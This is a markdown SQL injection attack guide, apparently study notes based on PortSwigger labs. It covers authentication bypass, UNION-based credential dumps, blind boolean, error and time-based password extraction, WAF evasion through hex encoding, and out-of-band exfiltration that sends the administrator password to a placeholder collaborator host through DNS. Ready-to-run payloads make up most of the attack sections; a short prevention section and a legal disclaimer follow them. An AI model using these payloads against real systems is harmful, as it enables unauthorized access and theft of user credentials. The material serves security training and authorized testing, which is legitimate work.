# 💉 SQL Injection - Complete Attack Guide

> 🎯 Comprehensive guide to SQL injection vulnerabilities, from basic to advanced exploitation techniques

---

## 📋 Table of Contents

- 🔑 Key Concepts
- 📝 Basic SQL Injection
- 🔗 Union-Based Attacks
- 🕵️ Blind SQL Injection
- ❌ Error-Based Injection
- ⏱️ Time-Based Injection
- 🌐 Out-of-Band Injection
- 🚧 Filter Bypass Techniques
- 🗄️ Database-Specific Payloads

---

## 🔑 Key Concepts - Before Diving In

> [!important] Essential Understanding Master these concepts before attempting SQL injection attacks

### 1️⃣ Finding Injection Points

**Common Vulnerable Parameters:**

- 🔐 Login fields (username/password)
- 🔗 URL parameters (`?id=`, `?product=`, `?gift=`)
- 🔍 Search boxes
- 📝 Any user input field
- 🍪 Cookies
- 📨 HTTP headers

---

### 2️⃣ Testing for SQL Injection

**Basic Test:**

```sql
'
```

> [!tip] Detection Method If inserting a single quote (`'`) returns:
> 
> - ❌ **500 Internal Server Error** → SQL injection exists
> - ⚠️ **Syntax error** → SQL injection exists
> - ✅ **Normal behavior** → May be protected or not vulnerable

---

### 3️⃣ Understanding Blind SQL Injection

> [!warning] Harder to Detect Blind SQL injection doesn't return errors. Detection requires analyzing website behavior changes.

**Indicators:**

- Page content changes
- Response time differences
- Different HTTP status codes
- Conditional responses

---

## 📝 1. Retrieval of Hidden Data

> [!note] Scenario Companies often hide unreleased products/prices in databases. SQL injection can expose this hidden data prematurely.

### 🎯 Attack Methodology

**Step 1:** Find vulnerable parameter

```
https://example.com/products?category=Gifts
```

**Step 2:** Test for vulnerability

```sql
https://example.com/products?category=Gifts'
```

**Response:** 500 Error → Vulnerable ✅

**Step 3:** Inject malicious query

```sql
' OR 1=1--
```

**Complete URL:**

```
https://example.com/products?category=Gifts' OR 1=1--
```

> [!success] Result 💥 All products displayed, including hidden ones!

### 📖 How It Works

**Original Query:**

```sql
SELECT * FROM products WHERE category = 'Gifts'
```

**Injected Query:**

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--'
```

**Explanation:**

- `OR 1=1` → Always true
- `--` → Comments out rest of query
- Returns all products regardless of category

---

## 🔓 2. Authentication Bypass

> [!danger] Critical Vulnerability Login directly without credentials using SQL injection

### 🎯 Attack Methodology

**Step 1:** Inject into username field

```
Username: admin' OR 1=1--
Password: anything
```

**Step 2:** Alternatively, inject into password

```
Username: admin
Password: ' OR 1=1--
```

### 📖 How It Works

**Original Query:**

```sql
SELECT * FROM users WHERE username='admin' AND password='userpass'
```

**Injected Query:**

```sql
SELECT * FROM users WHERE username='admin' OR 1=1--' AND password='anything'
```

**Explanation:**

- `OR 1=1` makes condition always true
- `--` comments out password check
- Authentication bypassed!

> [!success] Result 🔓 Logged in as admin without knowing password!

---

## 🔍 3. Database Enumeration - Version Detection

> [!info] Goal Identify database type and version for targeted attacks

### 📊 Database Version Queries

#### Oracle

```sql
' UNION SELECT banner, NULL FROM v$version--
```

#### Microsoft SQL Server

```sql
' UNION SELECT @@version, NULL#
```

#### PostgreSQL

```sql
' UNION SELECT version(), NULL#
```

#### MySQL

```sql
' UNION SELECT @@version, NULL#
```

---

## 🗄️ 4. Database Content Enumeration (Non-Oracle)

> [!note] Complete Database Extraction Process Step-by-step guide to extract usernames and passwords

### Step 1️⃣: Find Number of Columns

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

> [!tip] Method Increment number until you get an error. Last successful number = column count

**Example:**

```sql
' ORDER BY 1--  ✅ Works
' ORDER BY 2--  ✅ Works
' ORDER BY 3--  ❌ Error
```

**Result:** Table has 2 columns

---

### Step 2️⃣: Find Column Data Types

**Method 1: String Test**

```sql
' UNION SELECT 'a','a'--
' UNION SELECT 'a','a','a'--  (add more 'a' based on column count)
```

**Method 2: NULL Test**

```sql
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, 'a'--
' UNION SELECT 'a', NULL--
```

**For Oracle:**

```sql
' UNION SELECT 'a','a' FROM DUAL--
```

> [!info] Why This Works If successful, column accepts string data. Test each column position to find which accept text.

---

### Step 3️⃣: Database Version

```sql
' UNION SELECT version(), NULL--
```

---

### Step 4️⃣: List All Tables

#### Microsoft SQL Server

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

#### PostgreSQL

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

#### MySQL

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables--
```

#### Oracle

```sql
' UNION SELECT table_name, NULL FROM all_tables--
```

---

### Step 5️⃣: List Columns in Target Table

#### Microsoft SQL Server / PostgreSQL / MySQL

```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
```

#### Oracle

```sql
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS'--
```

> [!warning] Note Oracle table names are usually uppercase

---

### Step 6️⃣: Extract Usernames and Passwords

```sql
' UNION SELECT username, password FROM users--
```

> [!success] Result 🎉 Complete credential dump achieved!

---

## 🔮 5. Database Content Enumeration (Oracle)

> [!note] Oracle-Specific Syntax Oracle requires `FROM DUAL` in many queries

### Complete Attack Chain

**Step 1:** Find column count

```sql
' ORDER BY 1--
' ORDER BY 2--
```

**Step 2:** Find data types

```sql
' UNION SELECT 'a','a' FROM DUAL--
```

**Step 3:** Find table names

```sql
' UNION SELECT table_name, NULL FROM all_tables--
```

**Step 4:** Find column names

```sql
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_ERNOQG'--
```

**Step 5:** Extract data

```sql
' UNION SELECT USERNAME_LSXZFK, PASSWORD_NINVDN FROM USERS_ERNOQG--
```

---

## 🔗 6. UNION Attack - Multiple Values in Single Column

> [!note] Problem What if you have only one column to display both username and password?

### Solution: String Concatenation

#### Standard SQL (PostgreSQL, MySQL)

```sql
' UNION SELECT username || '*' || password FROM users--
```

#### Alternative Syntax

```sql
' UNION SELECT CONCAT(username, '*', password) FROM users--
```

**Output Example:**

```
admin*P@ssw0rd123
user1*Welcome!123
user2*Qwerty789
```

> [!tip] Separator Use a unique separator (`*`, `~`, `|`) to easily parse results

---

## 🕵️ 7. Blind SQL Injection - Conditional Responses

> [!warning] Challenging Website removes content instead of showing errors

### 🎯 Detection Process

**Step 1:** Test basic injection

```sql
'
```

**Result:** "Welcome back!" message disappears

**Step 2:** Fix the query

```sql
'--
```

**Result:** "Welcome back!" reappears

**Step 3:** Test boolean conditions

```sql
' OR 1=1--  → True  (content visible)
' OR 1=2--  → False (content missing)
```

---

### 🔍 Enumeration Process

#### Check if Table Exists

```sql
' AND (SELECT 'a' FROM users LIMIT 1)='a
```

**Explanation:**

- `SELECT 'a' FROM users` → Returns 'a' if table exists
- `LIMIT 1` → Prevents infinite loops in large tables
- `='a` → Completes the query

---

#### Check if Specific User Exists

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator')='a
```

> [!info] No LIMIT Needed When checking specific username, LIMIT 1 is unnecessary

---

#### Find Password Length

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>10)='a
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>20)='a
```

> [!tip] Binary Search Use binary search to find exact length faster:
> 
> - Try 10 → works
> - Try 20 → works
> - Try 30 → fails
> - Length is between 20-30

---

#### Extract Password Character by Character

```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

**SUBSTRING Syntax:**

```sql
SUBSTRING(password, position, length)
```

**Examples:**

```sql
SUBSTRING(password,1,1)  → 1st character
SUBSTRING(password,2,1)  → 2nd character
SUBSTRING(password,3,1)  → 3rd character
```

**Brute Force Process:**

```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a  ❌
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='b  ❌
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='p  ✅
```

### 🔧 Burp Suite Automation

**Payload Positions:**

```sql
' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§
```

**Payload Sets:**

- Position 1: Numbers (1-20 for password length)
- Position 2: Lowercase + uppercase + numbers + special chars

**Attack Type:** Cluster Bomb

---

## ❌ 8. Blind SQL Injection - Conditional Errors

> [!note] Scenario Website shows errors but not query results

### 🎯 Oracle-Specific Attack

**Step 1:** Test for vulnerability

```sql
'       → Error
''      → Fixed (no error)
```

**Step 2:** Test backend SQL execution

```sql
' || (SELECT '' FROM dual) || '
```

**Explanation:**

- `||` → Concatenation operator in Oracle
- `''` → Empty string
- `FROM dual` → Oracle-specific syntax

---

**Step 3:** Check if users table exists

```sql
' || (SELECT '' FROM users WHERE rownum=1) || '
```

> [!info] ROWNUM
> 
> - `rownum=1` limits to one row
> - Invalid rownum converts to NULL (still valid syntax)

---

**Step 4:** Check specific user with conditional error

**Concept:**

```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'  → Error
'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'  → Success
```

**Explanation:**

- `CASE WHEN` → Conditional statement
- `1=1` → True → Execute THEN
- `TO_CHAR(1/0)` → Division by zero → Error!
- `1=2` → False → Execute ELSE → Empty string → Success

**Real Attack:**

```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

> [!tip] SQL Execution Order `FROM` clause executes first. If username exists, enters CASE statement and throws error.

---

**Step 5:** Find password length

```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)=20)||'
```

**Step 6:** Extract password

```sql
'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,1,1)='a')||'
```

> [!success] Logic If character is correct → Error thrown → Character found!

**Step 7:** Automate with Burp Suite

- Payload 1: Position number (1-20)
- Payload 2: Character brute force (a-z, A-Z, 0-9)

---

## 🔍 9. Visible Error-Based SQL Injection

> [!note] Convert Blind to Visible Expose backend queries through error messages

### 🎯 Attack Methodology

**Step 1:** Test with quote

```sql
'
```

**Step 2:** Fix query

```sql
'--
```

**Step 3:** Test with CAST()

```sql
' AND CAST((SELECT 1) AS int)--
```

> [!info] CAST Function Converts data types. Use to trigger type errors that expose data.

**Step 4:** Test boolean condition

```sql
' AND 1=CAST((SELECT 1) AS int)--
```

**Result:** True (1=1)

---

**Step 5:** Extract username (single)

```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

**Error Message:**

```
ERROR: invalid input syntax for type integer: "administrator"
```

> [!success] Username Exposed! The error message reveals the username!

---

**Step 6:** Extract password

```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

**Error Message:**

```
ERROR: invalid input syntax for type integer: "P@ssw0rd123!"
```

> [!success] Password Exposed! Complete credential dump through error messages!

---

**Step 7:** Enumerate multiple users

```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1 OFFSET 0) AS int)--  → admin
' AND 1=CAST((SELECT username FROM users LIMIT 1 OFFSET 1) AS int)--  → user1
' AND 1=CAST((SELECT username FROM users LIMIT 1 OFFSET 2) AS int)--  → user2
```

---

## ⏱️ 10. Blind SQL Injection - Time Delays

> [!note] Detection Method Identify blind SQL injection by measuring response time

### 🕐 Database-Specific Time Delay Payloads

#### Oracle

```sql
' || (dbms_pipe.receive_message(('a'),10))--
```

#### Microsoft SQL Server

```sql
' || (WAITFOR DELAY '0:0:10')--
```

#### PostgreSQL

```sql
' || (SELECT pg_sleep(10))--
```

#### MySQL

```sql
' || (SELECT SLEEP(10))--
```

> [!tip] Detection If page takes exactly 10 seconds to load → SQL injection confirmed!

---

## ⏲️ 11. Time-Based Data Retrieval

> [!note] Blind Data Extraction Extract data using conditional time delays

### 🎯 Attack Methodology

#### Concept Test

**True Condition:**

```sql
' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END)--
```

**Result:** 10 second delay

**False Condition:**

```sql
' || (SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(-1) END)--
```

**Result:** No delay (negative sleep = instant)

---

#### Check if User Exists

```sql
' || (SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--
```

**Result:**

- 10 second delay → User exists ✅
- No delay → User doesn't exist ❌

---

#### Find Password Length

```sql
' || (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>19) THEN pg_sleep(5) ELSE pg_sleep(-1) END FROM users)--
```

**Binary Search Method:**

```sql
LENGTH(password)>10  → Delay (password > 10 chars)
LENGTH(password)>20  → Delay (password > 20 chars)
LENGTH(password)>30  → No delay (password ≤ 30 chars)
LENGTH(password)=25  → Delay (password = 25 chars) ✅
```

---

#### Extract Password Character by Character

```sql
' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(-1) END FROM users)--
```

**Process:**

```sql
SUBSTRING(password,1,1)='a'  → No delay ❌
SUBSTRING(password,1,1)='b'  → No delay ❌
SUBSTRING(password,1,1)='p'  → 5 sec delay ✅ (Found!)
```

### 🔧 Automation Tips

> [!warning] Be Patient Time-based attacks are SLOW. Each character test takes 5+ seconds.

**Optimizations:**

- Use 5 seconds instead of 10
- Reduce character set (lowercase only first)
- Parallelize with multiple sessions
- Use Burp Intruder with appropriate throttling

---

## 🌐 12. Out-of-Band (OOB) SQL Injection

> [!note] Advanced Technique Use external domain to exfiltrate data when in-band methods don't work

### 🎯 Concept

```
┌──────────┐     ┌──────────────┐     ┌────────────────┐
│ Attacker │────▶│ Vulnerable   │────▶│ Burp Collab    │
│          │     │ Application  │     │ Server         │
└──────────┘     └──────────────┘     └────────────────┘
                        │                      ▲
                        └──────────────────────┘
                      DNS Lookup with data
```

---

### 📡 Detection Payloads

#### Oracle

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

**Elevated Privileges Method:**

```sql
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
```

---

#### Microsoft SQL Server

```sql
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
```

---

#### PostgreSQL

```sql
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
```

---

#### MySQL (Windows Only)

```sql
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')

SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```

---

## 📤 13. Out-of-Band Data Exfiltration

> [!success] Complete Data Extraction Extract passwords via DNS lookups

### 🎯 Attack Methodology

**Setup:**

1. Get Burp Collaborator subdomain: `abc123.burpcollaborator.net`
2. Inject payload that sends data via DNS
3. Check Collaborator server for DNS requests containing data

---

#### Oracle Exfiltration

```sql
' ||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual)--
```

**Result:**

```
DNS Request: P@ssw0rd123.abc123.burpcollaborator.net
```

---

#### Microsoft SQL Server Exfiltration

```sql
' ||(declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='administrator');exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"'))--
```

---

#### PostgreSQL Exfiltration

```sql
' ||(create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT password FROM users WHERE username='administrator');
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();)--
```

---

#### MySQL Exfiltration (Windows)

```sql
' ||(SELECT password FROM users WHERE username='administrator' INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a')--
```

---

## 🚧 14. Filter Bypass via XML Encoding

> [!note] WAF Evasion Use XML encoding with Hackvertor to bypass web application firewalls

### 🎯 Attack Methodology

**Step 1:** Find vulnerable parameter

```xml
<storeId>1</storeId>
```

**Step 2:** Test for SQLi and column count

```xml
<storeId>1 UNION SELECT NULL</storeId>
<storeId>1 UNION SELECT NULL,NULL</storeId>
```

**Step 3:** Extract credentials with concatenation

```xml
<storeId>1 UNION SELECT username || '~' || password FROM users</storeId>
```

---

### 🔧 Using Hackvertor Extension

**Step 1:** Install Hackvertor in Burp Suite

**Step 2:** Encode payload

```xml
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
```

**Encoded Output:**

```xml
<storeId>&#x31;&#x20;&#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;...</storeId>
```

> [!success] Bypass Achieved WAF doesn't recognize encoded payload, but database decodes and executes it!

---

## 🗄️ Database-Specific Cheat Sheet

### 🔍 Version Detection

|Database|Payload|
|---|---|
|Oracle|`SELECT banner FROM v$version`|
|Microsoft|`SELECT @@version`|
|PostgreSQL|`SELECT version()`|
|MySQL|`SELECT @@version`|

---

### 📋 List Tables

|Database|Payload|
|---|---|
|Oracle|`SELECT table_name FROM all_tables`|
|Microsoft|`SELECT table_name FROM information_schema.tables`|
|PostgreSQL|`SELECT table_name FROM information_schema.tables`|
|MySQL|`SELECT table_name FROM information_schema.tables`|

---

### 📊 List Columns

|Database|Payload|
|---|---|
|Oracle|`SELECT column_name FROM all_tab_columns WHERE table_name='USERS'`|
|Microsoft|`SELECT column_name FROM information_schema.columns WHERE table_name='users'`|
|PostgreSQL|`SELECT column_name FROM information_schema.columns WHERE table_name='users'`|
|MySQL|`SELECT column_name FROM information_schema.columns WHERE table_name='users'`|

---

### 🔗 String Concatenation

|Database|Syntax|
|---|---|
|Oracle|`'a' \| 'b'`|
|Microsoft|`'a' + 'b'`|
|PostgreSQL|`'a' \| 'b'`|
|MySQL|`CONCAT('a','b')`|

---

### 🕐 Time Delays

|Database|Payload|
|---|---|
|Oracle|`dbms_pipe.receive_message(('a'),10)`|
|Microsoft|`WAITFOR DELAY '0:0:10'`|
|PostgreSQL|`pg_sleep(10)`|
|MySQL|`SLEEP(10)`|

---

### 🔤 Substring Functions

|Database|Syntax|
|---|---|
|Oracle|`SUBSTR('string',1,1)`|
|Microsoft|`SUBSTRING('string',1,1)`|
|PostgreSQL|`SUBSTRING('string',1,1)`|
|MySQL|`SUBSTRING('string',1,1)`|

---

## 🛡️ Prevention & Mitigation

### ✅ Secure Coding Practices

#### 1️⃣ Use Parameterized Queries (Prepared Statements)

**❌ Vulnerable Code:**

```python
query = "SELECT * FROM users WHERE username='" + username + "'"
cursor.execute(query)
```

**✅ Secure Code:**

```python
query = "SELECT * FROM users WHERE username=?"
cursor.execute(query, (username,))
```

---

#### 2️⃣ Use ORM Frameworks

```python
# Django ORM
User.objects.filter(username=username)

# SQLAlchemy
session.query(User).filter(User.username == username)
```

---

#### 3️⃣ Input Validation

```python
import re

def validate_username(username):
    if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
        raise ValueError("Invalid username")
    return username
```

---

#### 4️⃣ Least Privilege Principle

```sql
-- Don't use root/admin for application
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, UPDATE ON database.* TO 'app_user'@'localhost';
-- No DROP, ALTER, or admin privileges
```

---

#### 5️⃣ Web Application Firewall (WAF)

```
Common WAF Solutions:
- ModSecurity
- Cloudflare WAF
- AWS WAF
- Imperva
```

---

## 🧪 Testing Checklist

- [ ] Test all input fields with `'`
- [ ] Try `' OR 1=1--` authentication bypass
- [ ] Test `ORDER BY` to find column count
- [ ] Try UNION SELECT attacks
- [ ] Test blind SQLi with boolean conditions
- [ ] Test blind SQLi with time delays
- [ ] Check for error-based information disclosure
- [ ] Try out-of-band techniques
- [ ] Test XML/JSON injection points
- [ ] Enumerate database version
- [ ] Extract table names
- [ ] Extract column names
- [ ] Dump credentials
- [ ] Test WAF bypass techniques

---

## 🔗 Resources

### 📚 Learning Resources

- 🌐 [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
- 📖 [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
- 🎓 [SQLMap Tutorial](http://sqlmap.org/)
- 📘 [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

### 🛠️ Tools

|Tool|Purpose|
|---|---|
|🔨 **SQLMap**|Automated SQL injection tool|
|🦊 **Burp Suite**|Manual testing and exploitation|
|🔍 **Havij**|Automated SQL injection tool|
|⚡ **jSQL Injection**|Java-based SQLi tool|
|🎯 **NoSQLMap**|NoSQL injection tool|

---

## ⚠️ Legal Disclaimer

> [!danger] Ethical Hacking Only
> 
> - ✅ Only test on systems you own or have explicit written permission to test
> - ✅ Bug bounty programs with clear scope
> - ✅ Authorized penetration testing engagements
> - ❌ Unauthorized testing is illegal and can result in criminal prosecution
> - ❌ "Just testing" is not a legal defense

---

## 📊 Attack Complexity Matrix

|Attack Type|Difficulty|Detection|Speed|Reliability|
|---|---|---|---|---|
|Basic SQLi|⭐ Easy|Easy|Fast|High|
|UNION-based|⭐⭐ Medium|Medium|Fast|High|
|Boolean Blind|⭐⭐⭐ Hard|Hard|Slow|Medium|
|Time-based|⭐⭐⭐⭐ Very Hard|Very Hard|Very Slow|Medium|
|Error-based|⭐⭐ Medium|Easy|Fast|High|
|Out-of-Band|⭐⭐⭐⭐ Very Hard|Very Hard|Medium|Low|

---

**Tags:** #sql-injection #web-security #database #pentesting #owasp #hacking


